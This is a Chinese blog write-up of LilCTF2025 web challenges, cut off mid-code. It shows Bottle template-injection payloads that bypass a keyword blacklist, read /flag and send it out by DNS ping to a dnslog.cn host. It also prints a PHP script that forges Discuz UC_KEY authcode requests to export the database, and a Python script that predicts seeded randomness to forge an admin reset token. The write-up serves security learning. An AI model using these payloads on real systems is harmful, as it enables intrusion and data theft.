@@ -1,0 +1,835 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="https://pic1.imgdb.cn/item/6891f04e58cb8da5c806dce6.jpg">
+  <link rel="icon" href="https://pic1.imgdb.cn/item/6891f04e58cb8da5c806dce6.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="suny">
+  <meta name="keywords" content="">
+  <meta name="referrer" content="no-referrer">
+  
+    <meta name="description" content="ez_bottle大致思路就是&#x2F;upload路由上传一个zip文件，然后bottle模版会渲染里面的文件 那么好，第一个问题就是他没有上传文件的地方，需要自己发起post请求，zip文件该怎么传呢？ 当然可以写一个脚本，这个最直接，不过这个题比较简单，写脚本浪费时间，更方便的是用Talend API Tester 那么payload如何构造？bottle的waf还是比较好绕的 12BLA">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LilCTF2025">
+<meta property="og:url" content="https://www.sunynov.top/2026/02/25/LilCTF2025/index.html">
+<meta property="og:site_name" content="suny">
+<meta property="og:description" content="ez_bottle大致思路就是&#x2F;upload路由上传一个zip文件，然后bottle模版会渲染里面的文件 那么好，第一个问题就是他没有上传文件的地方，需要自己发起post请求，zip文件该怎么传呢？ 当然可以写一个脚本，这个最直接，不过这个题比较简单，写脚本浪费时间，更方便的是用Talend API Tester 那么payload如何构造？bottle的waf还是比较好绕的 12BLA">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/img/image-20260304222223744.png">
+<meta property="article:published_time" content="2026-02-25T08:16:12.000Z">
+<meta property="article:modified_time" content="2026-03-04T14:22:38.965Z">
+<meta property="article:author" content="suny">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/bobrocket/img/raw/master/img/image-20260304222223744.png">
+  
+  
+  
+  <title>LilCTF2025 - suny</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.sunynov.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>suny</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://gitee.com/bobrocket/img/raw/master/img/62c579525be16ec74a579b15.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="LilCTF2025"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        suny
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-25 16:16" pubdate>
+          2026年2月25日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          41 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">LilCTF2025</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2026年3月4日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="ez-bottle"><a href="#ez-bottle" class="headerlink" title="ez_bottle"></a>ez_bottle</h2><p>大致思路就是&#x2F;upload路由上传一个zip文件，然后bottle模版会渲染里面的文件</p>
+<p>那么好，第一个问题就是他没有上传文件的地方，需要自己发起post请求，zip文件该怎么传呢？</p>
+<p>当然可以写一个脚本，这个最直接，不过这个题比较简单，写脚本浪费时间，更方便的是用Talend API Tester</p>
+<p>那么payload如何构造？bottle的waf还是比较好绕的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">BLACK_DICT = [<span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;sock&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;bul&quot;</span>, <span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;globals&quot;</span>,<br>              <span class="hljs-string">&quot;get&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>]<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/i2u9/p/bottle-template.html">bottlepy template - Simple Love - 博客园</a>  这个可以绕过花括号，关键字的话全角、斜体、异形相近字符都可以</p>
+<p>但是这个题没有回显，可以利用报错输出，也可以dnslog外带</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">% <span class="hljs-keyword">import</span> ºs<br>% flag=ºs.pºpen(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).<span class="hljs-keyword">read</span>()<br>% <span class="hljs-keyword">raise</span> <span class="hljs-keyword">Exception</span>(flag)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">import</span></span> pty<br><span class="hljs-tag">%<span class="hljs-selector-tag">pty</span><span class="hljs-selector-class">.spawn</span>([&#x27;/bin/sh&#x27;, &#x27;-c&#x27;, &#x27;ping -c 1 `cat /flag|base64|tr -d &quot;\n&quot;`.abcdef.dnslog.cn&#x27;])</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260225163225160.png" srcset="/img/loading.gif" lazyload alt="image-20260225163225160"></p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260225163239946.png" srcset="/img/loading.gif" lazyload alt="image-20260225163239946"></p>
+<h2 id="我曾经有一份工作"><a href="#我曾经有一份工作" class="headerlink" title="我曾经有一份工作"></a>我曾经有一份工作</h2><p>需要一些脑洞，不看wp真想不出来，一开始还以为是SQL注入，到处找注入点</p>
+<p>dirsearch扫一下目录，发现<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p>config目录下发现UC_KEY</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260226144350645.png" srcset="/img/loading.gif" lazyload alt="image-20260226144350645"></p>
+<p>代码审计一下api目录，有一个dbbak.php可以备份sql数据库，丢给ai能直接出加密脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_KEY&#x27;</span>, <span class="hljs-string">&#x27;N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_authcode</span>(<span class="hljs-params"><span class="hljs-variable">$string</span>, <span class="hljs-variable">$operation</span> = <span class="hljs-string">&#x27;DECODE&#x27;</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$expiry</span> = <span class="hljs-number">0</span></span>) </span>&#123;<br>    <span class="hljs-variable">$ckey_length</span> = <span class="hljs-number">4</span>;<br><br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$key</span> ? <span class="hljs-variable">$key</span> : UC_KEY);<br>    <span class="hljs-variable">$keya</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>));<br>    <span class="hljs-variable">$keyb</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">16</span>, <span class="hljs-number">16</span>));<br>    <span class="hljs-variable">$keyc</span> = <span class="hljs-variable">$ckey_length</span> ? (<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;DECODE&#x27;</span> ? <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$string</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$ckey_length</span>): <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">microtime</span>()), -<span class="hljs-variable">$ckey_length</span>)) : <span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-variable">$cryptkey</span> = <span class="hljs-variable">$keya</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$keya</span>.<span class="hljs-variable">$keyc</span>);<br>    <span class="hljs-variable">$key_length</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cryptkey</span>);<br><br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;DECODE&#x27;</span> ? <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$string</span>, <span class="hljs-variable">$ckey_length</span>)) : <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;%010d&#x27;</span>, <span class="hljs-variable">$expiry</span> ? <span class="hljs-variable">$expiry</span> + <span class="hljs-title function_ invoke__">time</span>() : <span class="hljs-number">0</span>).<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$string</span>.<span class="hljs-variable">$keyb</span>), <span class="hljs-number">0</span>, <span class="hljs-number">16</span>).<span class="hljs-variable">$string</span>;<br>    <span class="hljs-variable">$string_length</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>);<br><br>    <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$box</span> = <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>);<br><br>    <span class="hljs-variable">$rndkey</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt;= <span class="hljs-number">255</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$rndkey</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$cryptkey</span>[<span class="hljs-variable">$i</span> % <span class="hljs-variable">$key_length</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$j</span> = (<span class="hljs-variable">$j</span> + <span class="hljs-variable">$box</span>[<span class="hljs-variable">$i</span>] + <span class="hljs-variable">$rndkey</span>[<span class="hljs-variable">$i</span>]) % <span class="hljs-number">256</span>;<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$box</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>];<br>        <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>] = <span class="hljs-variable">$tmp</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$a</span> = <span class="hljs-variable">$j</span> = <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$string_length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$a</span> = (<span class="hljs-variable">$a</span> + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        <span class="hljs-variable">$j</span> = (<span class="hljs-variable">$j</span> + <span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>]) % <span class="hljs-number">256</span>;<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>];<br>        <span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>] = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>];<br>        <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>] = <span class="hljs-variable">$tmp</span>;<br>        <span class="hljs-variable">$result</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]) ^ (<span class="hljs-variable">$box</span>[(<span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>] + <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>]) % <span class="hljs-number">256</span>]));<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;DECODE&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span>(((<span class="hljs-keyword">int</span>)<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$result</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>) == <span class="hljs-number">0</span> || (<span class="hljs-keyword">int</span>)<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$result</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>) - <span class="hljs-title function_ invoke__">time</span>() &gt; <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$result</span>, <span class="hljs-number">10</span>, <span class="hljs-number">16</span>) === <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$result</span>, <span class="hljs-number">26</span>).<span class="hljs-variable">$keyb</span>), <span class="hljs-number">0</span>, <span class="hljs-number">16</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$result</span>, <span class="hljs-number">26</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$keyc</span>.<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$result</span>));<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode_arr</span>(<span class="hljs-params"><span class="hljs-variable">$get</span></span>) </span>&#123;<br>    <span class="hljs-variable">$tmp</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$get</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>        <span class="hljs-variable">$tmp</span> .= <span class="hljs-string">&#x27;&amp;&#x27;</span>.<span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;=&#x27;</span>.<span class="hljs-variable">$val</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">_authcode</span>(<span class="hljs-variable">$tmp</span>, <span class="hljs-string">&#x27;ENCODE&#x27;</span>, UC_KEY);<br>&#125;<br><br><span class="hljs-variable">$get</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;time&#x27;</span>=&gt;<span class="hljs-title function_ invoke__">time</span>(),<span class="hljs-string">&#x27;method&#x27;</span>=&gt;<span class="hljs-string">&#x27;export&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">encode_arr</span>(<span class="hljs-variable">$get</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br></code></pre></td></tr></table></figure>
+
+<p>然后get请求备份数据库</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260226150048861.png" srcset="/img/loading.gif" lazyload alt="image-20260226150048861"></p>
+<p>下载数据库找pre_a_flag表</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260226150120226.png" srcset="/img/loading.gif" lazyload alt="image-20260226150120226"></p>
+<p>hex解码</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260226150144383.png" srcset="/img/loading.gif" lazyload alt="image-20260226150144383"></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/IDkUpjPL0mzSxKOgldHPeQ">失败的Discuz渗透总结</a></p>
+<h2 id="Ekko-note"><a href="#Ekko-note" class="headerlink" title="Ekko_note"></a>Ekko_note</h2><p>通过这个题学习了一下UUID和random伪随机</p>
+<p>我们先看一下RCE部分</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260226201422215.png" srcset="/img/loading.gif" lazyload alt="image-20260226201422215"></p>
+<p>需要验证时间&gt;2066，但时间是通过api接口获取的当下时间</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260226201559274.png" srcset="/img/loading.gif" lazyload alt="image-20260226201559274"></p>
+<p>首页提醒我们admin账户可以随时调整api地址，那么下一步就是拿到admin账户。它有一个忘记密码的功能，会发送token到注册邮箱(bushi)，那么这个token能否伪造？</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">token = <span class="hljs-built_in">str</span>(uuid.uuid8(a=padding(user.username)))<br></code></pre></td></tr></table></figure>
+
+<p>我们看一下uuid8的代码逻辑</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260226201928274.png" srcset="/img/loading.gif" lazyload alt="image-20260226201928274"></p>
+<p>调用了random，而开头就设置了随机种子，那么加密的结果就是可预测的了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。</span><br><span class="hljs-comment"># 反正整个程序没有一个地方用到random库。应该没有什么问题。</span><br><span class="hljs-keyword">import</span> random<br>random.seed(SERVER_START_TIME)<br></code></pre></td></tr></table></figure>
+
+<p>随机种子是运行时长，怎么获得呢？</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260226202436674.png" srcset="/img/loading.gif" lazyload alt="image-20260226202436674"></p>
+<p>&#x2F;server_info路由就有。下面就可以伪造token了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> uuid<br>random.seed(<span class="hljs-number">1772107995.1674747</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">input_string</span>):<br>    byte_string = input_string.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(byte_string) &gt; <span class="hljs-number">6</span>: byte_string = byte_string[:<span class="hljs-number">6</span>]<br>    padded_byte_string = byte_string.ljust(<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    padded_int = <span class="hljs-built_in">int</span>.from_bytes(padded_byte_string, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br>    <span class="hljs-keyword">return</span> padded_int<br><br>token = <span class="hljs-built_in">str</span>(uuid.uuid8(a=padding(<span class="hljs-string">&quot;admin&quot;</span>)))<br><span class="hljs-built_in">print</span>(token)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260226203034132.png" srcset="/img/loading.gif" lazyload alt="image-20260226203034132"></p>
+<p>成功了，下面要更改api，自己搭一个</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> http.server <span class="hljs-keyword">import</span> BaseHTTPRequestHandler, HTTPServer<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JSONRequestHandler</span>(<span class="hljs-title class_ inherited__">BaseHTTPRequestHandler</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_GET</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.path == <span class="hljs-string">&quot;/&quot;</span>:<br>            data = &#123;<span class="hljs-string">&quot;date&quot;</span>: <span class="hljs-string">&quot;2099-07-05 00:00:00&quot;</span>&#125;<br>        <span class="hljs-variable language_">self</span>.send_response(<span class="hljs-number">200</span>)<br>        <span class="hljs-variable language_">self</span>.send_header(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.end_headers()<br>        <span class="hljs-variable language_">self</span>.wfile.write(json.dumps(data).encode(<span 